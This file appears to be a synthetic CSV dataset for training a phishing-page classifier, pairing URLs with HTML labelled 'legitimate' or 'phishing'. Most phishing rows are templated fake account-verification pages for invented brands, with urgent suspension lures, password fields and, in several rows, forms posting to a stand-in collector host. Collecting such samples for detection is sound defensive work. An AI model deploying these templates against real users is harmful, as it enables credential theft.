url,html,label
https://example.org/articles/66,"<!doctype html><html><head><title>CloudMail — Home</title></head>
    <body><header><a href=""/about"">About</a><a href=""/products"">Products</a><a href=""/contact"">Contact</a><a href=""/privacy"">Privacy</a></header><main><h1>Welcome to CloudMail</h1>
    <p>Learn about our services, support resources, and public information.</p>
    <img src=""/assets/logo.png"" alt=""logo""><a href=""/terms"">Terms</a></main></body></html>",legitimate
http://account-validation.help/login46,"<!doctype html><html><head><title>Northstar Bank Account Verification</title>
    <meta http-equiv=""refresh"" content=""0;url=/continue""></head><body>
    <h1>Urgent: verify your Northstar Bank account immediately</h1><p>Your access is suspended. Confirm password and payment details now.</p>
    <form action=""/verify"" method=""post""><input type=""hidden"" name=""token"" value=""x"">
    <input name=""email"" type=""email""><input name=""password"" type=""password""><button>Verify now</button></form>
    <iframe src=""https://tracking.invalid/frame""></iframe><a href=""javascript:void(0)"">Continue</a></body></html>",phishing
http://login-check-support.click/secure-update74,"<!doctype html><html><head><title>MediaBox Account Verification</title>
    <meta http-equiv=""refresh"" content=""0;url=/continue""></head><body>
    <h1>Urgent: verify your MediaBox account immediately</h1><p>Your access is suspended. Confirm password and payment details now.</p>
    <form action=""/verify"" method=""post""><input type=""hidden"" name=""token"" value=""x"">
    <input name=""email"" type=""email""><input name=""password"" type=""password""><button>Verify now</button></form>
    <iframe src=""https://tracking.invalid/frame""></iframe><a href=""javascript:void(0)"">Continue</a></body></html>",phishing
https://news.example.net/articles/31,"<!doctype html><html><head><title>PayWay — Home</title></head>
    <body><header><a href=""/about"">About</a><a href=""/products"">Products</a><a href=""/contact"">Contact</a><a href=""/privacy"">Privacy</a></header><main><h1>Welcome to PayWay</h1>
    <p>Learn about our services, support resources, and public information.</p>
    <img src=""/assets/logo.png"" alt=""logo""><a href=""/terms"">Terms</a></main></body></html>",legitimate
https://university.example.edu/articles/84,"<!doctype html><html><head><title>Northstar Bank — Home</title></head>
    <body><header><a href=""/about"">About</a><a href=""/products"">Products</a><a href=""/contact"">Contact</a><a href=""/privacy"">Privacy</a></header><main><h1>Welcome to Northstar Bank</h1>
    <p>Learn about our services, support resources, and public information.</p>
    <img src=""/assets/logo.png"" alt=""logo""><a href=""/terms"">Terms</a></main></body></html>",legitimate
http://verify-billing-center.top/secure-update81,"<!doctype html><html><head><title>MediaBox Account Verification</title>
    <meta http-equiv=""refresh"" content=""0;url=/continue""></head><body>
    <h1>Urgent: verify your MediaBox account immediately</h1><p>Your access is suspended. Confirm password and payment details now.</p>
    <form action=""https://collect-details.invalid/submit"" method=""post""><input type=""hidden"" name=""token"" value=""x"">
    <input name=""email"" type=""email""><input name=""password"" type=""password""><button>Verify now</button></form>
    <iframe src=""https://tracking.invalid/frame""></iframe><a href=""javascript:void(0)"">Continue</a></body></html>",phishing
http://account-validation.help/secure-update180,"<!doctype html><html><head><title>MediaBox Account Verification</title>
    <meta http-equiv=""refresh"" content=""0;url=/continue""></head><body>
    <h1>Urgent: verify your MediaBox account immediately</h1><p>Your access is suspended. Confirm password and payment details now.</p>
    <form action=""https://collect-details.invalid/submit"" method=""post""><input type=""hidden"" name=""token"" value=""x"">
    <input name=""email"" type=""email""><input name=""password"" type=""password""><button>Verify now</button></form>
    <iframe src=""https://tracking.invalid/frame""></iframe><a href=""javascript:void(0)"">Continue</a></body></html>",phishing
https://docs.example.com/articles/94,"<!doctype html><html><head><title>Northstar Bank — Home</title></head>
    <body><header><a href=""/about"">About</a><a href=""/products"">Products</a><a href=""/contact"">Contact</a><a href=""/privacy"">Privacy</a></header><main><h1>Welcome to Northstar Bank</h1>
    <p>Learn about our services, support resources, and public information.</p>
    <img src=""/assets/logo.png"" alt=""logo""><a href=""/terms"">Terms</a></main></body></html>",legitimate
http://verify-billing-center.top/secure-update188,"<!doctype html><html><head><title>ShopSphere Account Verification</title>
    <meta http-equiv=""refresh"" content=""0;url=/continue""></head><body>
    <h1>Urgent: verify your ShopSphere account immediately</h1><p>Your access is suspended. Confirm password and payment details now.</p>
    <form action=""https://collect-details.invalid/submit"" method=""post""><input type=""hidden"" name=""token"" value=""x"">
    <input name=""email"" type=""email""><input name=""password"" type=""password""><button>Verify now</button></form>
    <iframe src=""https://tracking.invalid/frame""></iframe><a href=""javascript:void(0)"">Continue</a></body></html>",phishing
http://verify-billing-center.top/login211,"<!doctype html><html><head><title>CloudMail Account Verification</title>
    <meta http-equiv=""refresh"" content=""0;url=/continue""></head><body>
    <h1>Urgent: verify your CloudMail account immediately</h1><p>Your access is suspended. Confirm password and payment details now.</p>
    <form action=""/verify"" method=""post""><input type=""hidden"" name=""token"" value=""x"">
    <input name=""email"" type=""email""><input name=""password"" type=""password""><button>Verify now</button></form>
    <iframe src=""https://tracking.invalid/frame""></iframe><a href=""javascript:void(0)"">Continue</a></body></html>",phishing
https://university.example.edu/articles/153,"<!doctype html><html><head><title>MediaBox — Home</title></head>
    <body><header><a href=""/about"">About</a><a href=""/products"">Products</a><a href=""/contact"">Contact</a><a href=""/privacy"">Privacy</a></header><main><h1>Welcome to MediaBox</h1>
    <p>Learn about our services, support resources, and public information.</p>
    <img src=""/assets/logo.png"" alt=""logo""><a href=""/terms"">Terms</a></main></body></html>",legitimate
http://secure-confirm-account.xyz/verify/account175,"<!doctype html><html><head><title>PayWay Account Verification</title>
    <meta http-equiv=""refresh"" content=""0;url=/continue""></head><body>
    <h1>Urgent: verify your PayWay account immediately</h1><p>Your access is suspended. Confirm password and payment details now.</p>
    <form action=""https://collect-details.invalid/submit"" method=""post""><input type=""hidden"" name=""token"" value=""x"">
    <input name=""email"" type=""email""><input name=""password"" type=""password""><button>Verify now</button></form>
    <iframe src=""https://tracking.invalid/frame""></iframe><a href=""javascript:void(0)"">Continue</a></body></html>",phishing
https://store.example.org/articles/168,"<!doctype html><html><head><title>ShopSphere — Home</title></head>
    <body><header><a href=""/about"">About</a><a href=""/products"">Products</a><a href=""/contact"">Contact</a><a href=""/privacy"">Privacy</a></header><main><h1>Welcome to ShopSphere</h1>
    <p>Learn about our services, support resources, and public information.</p>
    <img src=""/assets/logo.png"" alt=""logo""><a href=""/terms"">Terms</a></main></body></html>",legitimate
http://secure-confirm-account.xyz/verify/account76,"<!doctype html><html><head><title>ShopSphere Account Verification</title>
    <meta http-equiv=""refresh"" content=""0;url=/continue""></head><body>
    <h1>Urgent: verify your ShopSphere account immediately</h1><p>Your access is suspended. Confirm password and payment details now.</p>
    <form action="""" method=""post""><input type=""hidden"" name=""token"" value=""x"">
    <input name=""email"" type=""email""><input name=""password"" type=""password""><button>Verify now</button></form>
    <iframe src=""https://tracking.invalid/frame""></iframe><a href=""javascript:void(0)"">Continue</a></body></html>",phishing
https://example.org/articles/5,"<!doctype html><html><head><title>PayWay — Home</title></head>
    <body><header><a href=""/about"">About</a><a href=""/products"">Products</a><a href=""/contact"">Contact</a><a href=""/privacy"">Privacy</a></header><main><h1>Welcome to PayWay</h1>
    <p>Learn about our services, support resources, and public information.</p>
    <img src=""/assets/logo.png"" alt=""logo""><a href=""/terms"">Terms</a></main></body></html>",legitimate
https://university.example.edu/articles/45,"<!doctype html><html><head><title>ShopSphere — Home</title></head>
    <body><header><a href=""/about"">About</a><a href=""/products"">Products</a><a href=""/contact"">Contact</a><a href=""/privacy"">Privacy</a></header><main><h1>Welcome to ShopSphere</h1>
    <p>Learn about our services, support resources, and public information.</p>
    <img src=""/assets/logo.png"" alt=""logo""><a href=""/terms"">Terms</a></main></body></html>",legitimate
http://verify-billing-center.top/login201,"<!doctype html><html><head><title>MediaBox Account Verification</title>
    <meta http-equiv=""refresh"" content=""0;url=/continue""></head><body>
    <h1>Urgent: verify your MediaBox account immediately</h1><p>Your access is suspended. Confirm password and payment details now.</p>
    <form action=""https://collect-details.invalid/submit"" method=""post""><input type=""hidden"" name=""token"" value=""x"">
    <input name=""email"" type=""email""><input name=""password"" type=""password""><button>Verify now</button></form>
    <iframe src=""https://tracking.invalid/frame""></iframe><a href=""javascript:void(0)"">Continue</a></body></html>",phishing
http://secure-confirm-account.xyz/signin?session=1298210,"<!doctype html><html><head><title>Northstar Bank Account Verification</title>
    <meta http-equiv=""refresh"" content=""0;url=/continue""></head><body>
    <h1>Urgent: verify your Northstar Bank account immediately</h1><p>Your access is suspended. Confirm password and payment details now.</p>
    <form action=""https://collect-details.invalid/submit"" method=""post""><input type=""hidden"" name=""token"" value=""x"">
    <input name=""email"" type=""email""><input name=""password"" type=""password""><button>Verify now</button></form>
    <iframe src=""https://tracking.invalid/frame""></iframe><a href=""javascript:void(0)"">Continue</a></body></html>",phishing
http://secure-confirm-account.xyz/signin?session=1298158,"<!doctype html><html><head><title>CloudMail Account Verification</title>
    <meta http-equiv=""refresh"" content=""0;url=/continue""></head><body>
    <h1>Urgent: verify your CloudMail account immediately</h1><p>Your access is suspended. Confirm password and payment details now.</p>
    <form action="""" method=""post""><input type=""hidden"" name=""token"" value=""x"">
    <input name=""email"" type=""email""><input name=""password"" type=""password""><button>Verify now</button></form>
    <iframe src=""https://tracking.invalid/frame""></iframe><a href=""javascript:void(0)"">Continue</a></body></html>",phishing
http://login-check-support.click/signin?session=1298197,"<!doctype html><html><head><title>MediaBox Account Verification</title>
    <meta http-equiv=""refresh"" content=""0;url=/continue""></head><body>
    <h1>Urgent: verify your MediaBox account immediately</h1><p>Your access is suspended. Confirm password and payment details now.</p>
    <form action=""/verify"" method=""post""><input type=""hidden"" name=""token"" value=""x"">
    <input name=""email"" type=""email""><input name=""password"" type=""password""><button>Verify now</button></form>
    <iframe src=""https://tracking.invalid/frame""></iframe><a href=""javascript:void(0)"">Continue</a></body></html>",phishing
https://docs.example.com/articles/16,"<!doctype html><html><head><title>ShopSphere — Home</title></head>
    <body><header><a href=""/about"">About</a><a href=""/products"">Products</a><a href=""/contact"">Contact</a><a href=""/privacy"">Privacy</a></header><main><h1>Welcome to ShopSphere</h1>
    <p>Learn about our services, support resources, and public information.</p>
    <img src=""/assets/logo.png"" alt=""logo""><a href=""/terms"">Terms</a></main></body></html>",legitimate
http://verify-billing-center.top/verify/account186,"<!doctype html><html><head><title>CloudMail Account Verification</title>
    <meta http-equiv=""refresh"" content=""0;url=/continue""></head><body>
    <h1>Urgent: verify your CloudMail account immediately</h1><p>Your access is suspended. Confirm password and payment details now.</p>
    <form action=""/verify"" method=""post""><input type=""hidden"" name=""token"" value=""x"">
    <input name=""email"" type=""email""><input name=""password"" type=""password""><button>Verify now</button></form>
    <iframe src=""https://tracking.invalid/frame""></iframe><a href=""javascript:void(0)"">Continue</a></body></html>",phishing
https://docs.example.com/articles/117,"<!doctype html><html><head><title>ShopSphere — Home</title></head>
    <body><header><a href=""/about"">About</a><a href=""/products"">Products</a><a href=""/contact"">Contact</a><a href=""/privacy"">Privacy</a></header><main><h1>Welcome to ShopSphere</h1>
    <p>Learn about our services, support resources, and public information.</p>
    <img src=""/assets/logo.png"" alt=""logo""><a href=""/terms"">Terms</a></main></body></html>",legitimate
http://verify-billing-center.top/login94,"<!doctype html><html><head><title>ShopSphere Account Verification</title>
    <meta http-equiv=""refresh"" content=""0;url=/continue""></head><body>
    <h1>Urgent: verify your ShopSphere account immediately</h1><p>Your access is suspended. Confirm password and payment details now.</p>
    <form action=""https://collect-details.invalid/submit"" method=""post""><input type=""hidden"" name=""token"" value=""x"">
    <input name=""email"" type=""email""><input name=""password"" type=""password""><button>Verify now</button></form>
    <iframe src=""https://tracking.invalid/frame""></iframe><a href=""javascript:void(0)"">Continue</a></body></html>",phishing
https://university.example.edu/articles/3,"<!doctype html><html><head><title>Northstar Bank — Home</title></head>
    <body><header><a href=""/about"">About</a><a href=""/products"">Products</a><a href=""/contact"">Contact</a><a href=""/privacy"">Privacy</a></header><main><h1>Welcome to Northstar Bank</h1>
    <p>Learn about our services, support resources, and public information.</p>
    <img src=""/assets/logo.png"" alt=""logo""><a href=""/terms"">Terms</a></main></body></html>",legitimate
https://store.example.org/articles/18,"<!doctype html><html><head><title>Northstar Bank — Home</title></head>
    <body><header><a href=""/about"">About</a><a href=""/products"">Products</a><a href=""/contact"">Contact</a><a href=""/privacy"">Privacy</a></header><main><h1>Welcome to Northstar Bank</h1>
    <p>Learn about our services, support resources, and public information.</p>
    <img src=""/assets/logo.png"" alt=""logo""><a href=""/terms"">Terms</a></main></body></html>",legitimate
http://login-check-support.click/verify/account173,"<!doctype html><html><head><title>Northstar Bank Account Verification</title>
    <meta http-equiv=""refresh"" content=""0;url=/continue""></head><body>
    <h1>Urgent: verify your Northstar Bank account immediately</h1><p>Your access is suspended. Confirm password and payment details now.</p>
    <form action=""/verify"" method=""post""><input type=""hidden"" name=""token"" value=""x"">
    <input name=""email"" type=""email""><input name=""password"" type=""password""><button>Verify now</button></form>
    <iframe src=""https://tracking.invalid/frame""></iframe><a href=""javascript:void(0)"">Continue</a></body></html>",phishing
https://store.example.org/articles/60,"<!doctype html><html><head><title>Northstar Bank — Home</title></head>
    <body><header><a href=""/about"">About</a><a href=""/products"">Products</a><a href=""/contact"">Contact</a><a href=""/privacy"">Privacy</a></header><main><h1>Welcome to Northstar Bank</h1>
    <p>Learn about our services, support resources, and public information.</p>
    <img src=""/assets/logo.png"" alt=""logo""><a href=""/terms"">Terms</a></main></body></html>",legitimate
http://login-check-support.click/login136,"<!doctype html><html><head><title>MediaBox Account Verification</title>
    <meta http-equiv=""refresh"" content=""0;url=/continue""></head><body>
    <h1>Urgent: verify your MediaBox account immediately</h1><p>Your access is suspended. Confirm password and payment details now.</p>
    <form action="""" method=""post""><input type=""hidden"" name=""token"" value=""x"">
    <input name=""email"" type=""email""><input name=""password"" type=""password""><button>Verify now</button></form>
    <iframe src=""https://tracking.invalid/frame""></iframe><a href=""javascript:void(0)"">Continue</a></body></html>",phishing
http://account-validation.help/secure-update51,"<!doctype html><html><head><title>ShopSphere Account Verification</title>
    <meta http-equiv=""refresh"" content=""0;url=/continue""></head><body>
    <h1>Urgent: verify your ShopSphere account immediately</h1><p>Your access is suspended. Confirm password and payment details now.</p>
    <form action="""" method=""post""><input type=""hidden"" name=""token"" value=""x"">
    <input name=""email"" type=""email""><input name=""password"" type=""password""><button>Verify now</button></form>
    <iframe src=""https://tracking.invalid/frame""></iframe><a href=""javascript:void(0)"">Continue</a></body></html>",phishing
https://university.example.edu/articles/63,"<!doctype html><html><head><title>CloudMail — Home</title></head>
    <body><header><a href=""/about"">About</a><a href=""/products"">Products</a><a href=""/contact"">Contact</a><a href=""/privacy"">Privacy</a></header><main><h1>Welcome to CloudMail</h1>
    <p>Learn about our services, support resources, and public information.</p>
    <img src=""/assets/logo.png"" alt=""logo""><a href=""/terms"">Terms</a></main></body></html>",legitimate
https://example.org/articles/110,"<!doctype html><html><head><title>ShopSphere — Home</title></head>
    <body><header><a href=""/about"">About</a><a href=""/products"">Products</a><a href=""/contact"">Contact</a><a href=""/privacy"">Privacy</a></header><main><h1>Welcome to ShopSphere</h1>
    <p>Learn about our services, support resources, and public information.</p>
    <img src=""/assets/logo.png"" alt=""logo""><a href=""/terms"">Terms</a></main></body></html>",legitimate
http://login-check-support.click/login58,"<!doctype html><html><head><title>MediaBox Account Verification</title>
    <meta http-equiv=""refresh"" content=""0;url=/continue""></head><body>
    <h1>Urgent: verify your MediaBox account immediately</h1><p>Your access is suspended. Confirm password and payment details now.</p>
    <form action="""" method=""post""><input type=""hidden"" name=""token"" value=""x"">
    <input name=""email"" type=""email""><input name=""password"" type=""password""><button>Verify now</button></form>
    <iframe src=""https://tracking.invalid/frame""></iframe><a href=""javascript:void(0)"">Continue</a></body></html>",phishing
https://docs.example.com/articles/208,"<!doctype html><html><head><title>ShopSphere — Home</title></head>
    <body><header><a href=""/about"">About</a><a href=""/products"">Products</a><a href=""/contact"">Contact</a><a href=""/privacy"">Privacy</a></header><main><h1>Welcome to ShopSphere</h1>
    <p>Learn about our services, support resources, and public information.</p>
    <img src=""/assets/logo.png"" alt=""logo""><a href=""/terms"">Terms</a></main></body></html>",legitimate
https://example.org/articles/29,"<!doctype html><html><head><title>CloudMail — Home</title></head>
    <body><header><a href=""/about"">About</a><a href=""/products"">Products</a><a href=""/contact"">Contact</a><a href=""/privacy"">Privacy</a></header><main><h1>Welcome to CloudMail</h1>
    <p>Learn about our services, support resources, and public information.</p>
    <img src=""/assets/logo.png"" alt=""logo""><a href=""/terms"">Terms</a></main></body></html>",legitimate
https://example.org/articles/140,"<!doctype html><html><head><title>Northstar Bank — Home</title></head>
    <body><header><a href=""/about"">About</a><a href=""/products"">Products</a><a href=""/contact"">Contact</a><a href=""/privacy"">Privacy</a></header><main><h1>Welcome to Northstar Bank</h1>
    <p>Learn about our services, support resources, and public information.</p>
    <img src=""/assets/logo.png"" alt=""logo""><a href=""/terms"">Terms</a></main></body></html>",legitimate
http://verify-billing-center.top/signin?session=1298132,"<!doctype html><html><head><title>ShopSphere Account Verification</title>
    <meta http-equiv=""refresh"" content=""0;url=/continue""></head><body>
    <h1>Urgent: verify your ShopSphere account immediately</h1><p>Your access is suspended. Confirm password and payment details now.</p>
    <form action=""https://collect-details.invalid/submit"" method=""post""><input type=""hidden"" name=""token"" value=""x"">
    <input name=""email"" type=""email""><input name=""password"" type=""password""><button>Verify now</button></form>
    <iframe src=""https://tracking.invalid/frame""></iframe><a href=""javascript:void(0)"">Continue</a></body></html>",phishing
http://account-validation.help/verify/account54,"<!doctype html><html><head><title>PayWay Account Verification</title>
    <meta http-equiv=""refresh"" content=""0;url=/continue""></head><body>
    <h1>Urgent: verify your PayWay account immediately</h1><p>Your access is suspended. Confirm password and payment details now.</p>
    <form action=""https://collect-details.invalid/submit"" method=""post""><input type=""hidden"" name=""token"" value=""x"">
    <input name=""email"" type=""email""><input name=""password"" type=""password""><button>Verify now</button></form>
    <iframe src=""https://tracking.invalid/frame""></iframe><a href=""javascript:void(0)"">Continue</a></body></html>",phishing
https://university.example.edu/articles/26,"<!doctype html><html><head><title>CloudMail — Home</title></head>
    <body><header><a href=""/about"">About</a><a href=""/products"">Products</a><a href=""/contact"">Contact</a><a href=""/privacy"">Privacy</a></header><main><h1>Welcome to CloudMail</h1>
    <p>Learn about our services, support resources, and public information.</p>
    <img src=""/assets/logo.png"" alt=""logo""><a href=""/terms"">Terms</a></main></body></html>",legitimate
https://docs.example.com/articles/7,"<!doctype html><html><head><title>ShopSphere — Home</title></head>
    <body><header><a href=""/about"">About</a><a href=""/products"">Products</a><a href=""/contact"">Contact</a><a href=""/privacy"">Privacy</a></header><main><h1>Welcome to ShopSphere</h1>
    <p>Learn about our services, support resources, and public information.</p>
    <img src=""/assets/logo.png"" alt=""logo""><a href=""/terms"">Terms</a></main></body></html>",legitimate
http://verify-billing-center.top/login191,"<!doctype html><html><head><title>Northstar Bank Account Verification</title>
    <meta http-equiv=""refresh"" content=""0;url=/continue""></head><body>
    <h1>Urgent: verify your Northstar Bank account immediately</h1><p>Your access is suspended. Confirm password and payment details now.</p>
    <form action="""" method=""post""><input type=""hidden"" name=""token"" value=""x"">
    <input name=""email"" type=""email""><input name=""password"" type=""password""><button>Verify now</button></form>
    <iframe src=""https://tracking.invalid/frame""></iframe><a href=""javascript:void(0)"">Continue</a></body></html>",phishing
http://account-validation.help/login179,"<!doctype html><html><head><title>ShopSphere Account Verification</title>
    <meta http-equiv=""refresh"" content=""0;url=/continue""></head><body>
    <h1>Urgent: verify your ShopSphere account immediately</h1><p>Your access is suspended. Confirm password and payment details now.</p>
    <form action="""" method=""post""><input type=""hidden"" name=""token"" value=""x"">
    <input name=""email"" type=""email""><input name=""password"" type=""password""><button>Verify now</button></form>
    <iframe src=""https://tracking.invalid/frame""></iframe><a href=""javascript:void(0)"">Continue</a></body></html>",phishing
https://docs.example.com/articles/108,"<!doctype html><html><head><title>PayWay — Home</title></head>
    <body><header><a href=""/about"">About</a><a href=""/products"">Products</a><a href=""/contact"">Contact</a><a href=""/privacy"">Privacy</a></header><main><h1>Welcome to PayWay</h1>
    <p>Learn about our services, support resources, and public information.</p>
    <img src=""/assets/logo.png"" alt=""logo""><a href=""/terms"">Terms</a></main></body></html>",legitimate
http://account-validation.help/verify/account126,"<!doctype html><html><head><title>ShopSphere Account Verification</title>
    <meta http-equiv=""refresh"" content=""0;url=/continue""></head><body>
    <h1>Urgent: verify your ShopSphere account immediately</h1><p>Your access is suspended. Confirm password and payment details now.</p>
    <form action="""" method=""post""><input type=""hidden"" name=""token"" value=""x"">
    <input name=""email"" type=""email""><input name=""password"" type=""password""><button>Verify now</button></form>
    <iframe src=""https://tracking.invalid/frame""></iframe><a href=""javascript:void(0)"">Continue</a></body></html>",phishing
http://login-check-support.click/verify/account190,"<!doctype html><html><head><title>ShopSphere Account Verification</title>
    <meta http-equiv=""refresh"" content=""0;url=/continue""></head><body>
    <h1>Urgent: verify your ShopSphere account immediately</h1><p>Your access is suspended. Confirm password and payment details now.</p>
    <form action=""https://collect-details.invalid/submit"" method=""post""><input type=""hidden"" name=""token"" value=""x"">
    <input name=""email"" type=""email""><input name=""password"" type=""password""><button>Verify now</button></form>
    <iframe src=""https://tracking.invalid/frame""></iframe><a href=""javascript:void(0)"">Continue</a></body></html>",phishing
https://university.example.edu/articles/118,"<!doctype html><html><head><title>ShopSphere — Home</title></head>
    <body><header><a href=""/about"">About</a><a href=""/products"">Products</a><a href=""/contact"">Contact</a><a href=""/privacy"">Privacy</a></header><main><h1>Welcome to ShopSphere</h1>
    <p>Learn about our services, support resources, and public information.</p>
    <img src=""/assets/logo.png"" alt=""logo""><a href=""/terms"">Terms</a></main></body></html>",legitimate
https://example.org/articles/114,"<!doctype html><html><head><title>Northstar Bank — Home</title></head>
    <body><header><a href=""/about"">About</a><a href=""/products"">Products</a><a href=""/contact"">Contact</a><a href=""/privacy"">Privacy</a></header><main><h1>Welcome to Northstar Bank</h1>
    <p>Learn about our services, support resources, and public information.</p>
    <img src=""/assets/logo.png"" alt=""logo""><a href=""/terms"">Terms</a></main></body></html>",legitimate
http://verify-billing-center.top/login196,"<!doctype html><html><head><title>MediaBox Account Verification</title>
    <meta http-equiv=""refresh"" content=""0;url=/continue""></head><body>
    <h1>Urgent: verify your MediaBox account immediately</h1><p>Your access is suspended. Confirm password and payment details now.</p>
    <form action=""/verify"" method=""post""><input type=""hidden"" name=""token"" value=""x"">
    <input name=""email"" type=""email""><input name=""password"" type=""password""><button>Verify now</button></form>
    <iframe src=""https://tracking.invalid/frame""></iframe><a href=""javascript:void(0)"">Continue</a></body></html>",phishing
https://docs.example.com/articles/210,"<!doctype html><html><head><title>CloudMail — Home</title></head>
    <body><header><a href=""/about"">About</a><a href=""/products"">Products</a><a href=""/contact"">Contact</a><a href=""/privacy"">Privacy</a></header><main><h1>Welcome to CloudMail</h1>
    <p>Learn about our services, support resources, and public information.</p>
    <img src=""/assets/logo.png"" alt=""logo""><a href=""/terms"">Terms</a></main></body></html>",legitimate
http://secure-confirm-account.xyz/signin?session=1298105,"<!doctype html><html><head><title>MediaBox Account Verification</title>
    <meta http-equiv=""refresh"" content=""0;url=/continue""></head><body>
    <h1>Urgent: verify your MediaBox account immediately</h1><p>Your access is suspended. Confirm password and payment details now.</p>
    <form action=""/verify"" method=""post""><input type=""hidden"" name=""token"" value=""x"">
    <input name=""email"" type=""email""><input name=""password"" type=""password""><button>Verify now</button></form>
    <iframe src=""https://tracking.invalid/frame""></iframe><a href=""javascript:void(0)"">Continue</a></body></html>",phishing
http://login-check-support.click/login115,"<!doctype html><html><head><title>CloudMail Account Verification</title>
    <meta http-equiv=""refresh"" content=""0;url=/continue""></head><body>
    <h1>Urgent: verify your CloudMail account immediately</h1><p>Your access is suspended. Confirm password and payment details now.</p>
    <form action="""" method=""post""><input type=""hidden"" name=""token"" value=""x"">
    <input name=""email"" type=""email""><input name=""password"" type=""password""><button>Verify now</button></form>
    <iframe src=""https://tracking.invalid/frame""></iframe><a href=""javascript:void(0)"">Continue</a></body></html>",phishing
http://secure-confirm-account.xyz/login142,"<!doctype html><html><head><title>PayWay Account Verification</title>
    <meta http-equiv=""refresh"" content=""0;url=/continue""></head><body>
    <h1>Urgent: verify your PayWay account immediately</h1><p>Your access is suspended. Confirm password and payment details now.</p>
    <form action=""https://collect-details.invalid/submit"" method=""post""><input type=""hidden"" name=""token"" value=""x"">
    <input name=""email"" type=""email""><input name=""password"" type=""password""><button>Verify now</button></form>
    <iframe src=""https://tracking.invalid/frame""></iframe><a href=""javascript:void(0)"">Continue</a></body></html>",phishing
https://university.example.edu/articles/199,"<!doctype html><html><head><title>PayWay — Home</title></head>
    <body><header><a href=""/about"">About</a><a href=""/products"">Products</a><a href=""/contact"">Contact</a><a href=""/privacy"">Privacy</a></header><main><h1>Welcome to PayWay</h1>
    <p>Learn about our services, support resources, and public information.</p>
    <img src=""/assets/logo.png"" alt=""logo""><a href=""/terms"">Terms</a></main></body></html>",legitimate
http://login-check-support.click/signin?session=1298171,"<!doctype html><html><head><title>CloudMail Account Verification</title>
    <meta http-equiv=""refresh"" content=""0;url=/continue""></head><body>
    <h1>Urgent: verify your CloudMail account immediately</h1><p>Your access is suspended. Confirm password and payment details now.</p>
    <form action=""/verify"" method=""post""><input type=""hidden"" name=""token"" value=""x"">
    <input name=""email"" type=""email""><input name=""password"" type=""password""><button>Verify now</button></form>
    <iframe src=""https://tracking.invalid/frame""></iframe><a href=""javascript:void(0)"">Continue</a></body></html>",phishing
https://store.example.org/articles/141,"<!doctype html><html><head><title>MediaBox — Home</title></head>
    <body><header><a href=""/about"">About</a><a href=""/products"">Products</a><a href=""/contact"">Contact</a><a href=""/privacy"">Privacy</a></header><main><h1>Welcome to MediaBox</h1>
    <p>Learn about our services, support resources, and public information.</p>
    <img src=""/assets/logo.png"" alt=""logo""><a href=""/terms"">Terms</a></main></body></html>",legitimate
http://login-check-support.click/signin?session=1298102,"<!doctype html><html><head><title>CloudMail Account Verification</title>
    <meta http-equiv=""refresh"" content=""0;url=/continue""></head><body>
    <h1>Urgent: verify your CloudMail account immediately</h1><p>Your access is suspended. Confirm password and payment details now.</p>
    <form action=""https://collect-details.invalid/submit"" method=""post""><input type=""hidden"" name=""token"" value=""x"">
    <input name=""email"" type=""email""><input name=""password"" type=""password""><button>Verify now</button></form>
    <iframe src=""https://tracking.invalid/frame""></iframe><a href=""javascript:void(0)"">Continue</a></body></html>",phishing
http://secure-confirm-account.xyz/signin?session=12982,"<!doctype html><html><head><title>MediaBox Account Verification</title>
    <meta http-equiv=""refresh"" content=""0;url=/continue""></head><body>
    <h1>Urgent: verify your MediaBox account immediately</h1><p>Your access is suspended. Confirm password and payment details now.</p>
    <form action=""/verify"" method=""post""><input type=""hidden"" name=""token"" value=""x"">
    <input name=""email"" type=""email""><input name=""password"" type=""password""><button>Verify now</button></form>
    <iframe src=""https://tracking.invalid/frame""></iframe><a href=""javascript:void(0)"">Continue</a></body></html>",phishing
http://secure-confirm-account.xyz/login145,"<!doctype html><html><head><title>CloudMail Account Verification</title>
    <meta http-equiv=""refresh"" content=""0;url=/continue""></head><body>
    <h1>Urgent: verify your CloudMail account immediately</h1><p>Your access is suspended. Confirm password and payment details now.</p>
    <form action="""" method=""post""><input type=""hidden"" name=""token"" value=""x"">
    <input name=""email"" type=""email""><input name=""password"" type=""password""><button>Verify now</button></form>
    <iframe src=""https://tracking.invalid/frame""></iframe><a href=""javascript:void(0)"">Continue</a></body></html>",phishing
